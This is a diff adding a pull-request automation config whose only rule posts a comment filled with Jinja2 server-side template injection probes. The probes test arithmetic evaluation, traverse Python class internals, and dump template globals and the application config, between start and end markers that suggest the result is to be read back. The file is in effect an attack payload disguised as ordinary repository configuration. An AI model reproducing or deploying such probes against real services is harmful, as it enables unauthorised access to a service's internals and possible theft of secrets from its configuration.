@@ -1,0 +1,16 @@
+pull_request_rules:
+  - name: ssti-probe
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          SSTI-PROBE-START
+          arith={{ 7*7 }}
+          author={{ author }}
+          cls={{ ''.__class__ }}
+          mro={{ ''.__class__.__mro__ }}
+          glob={{ cycler.__init__.__globals__ }}
+          lipsum={{ lipsum.__globals__ }}
+          conf={{ config }}
+          SSTI-PROBE-END
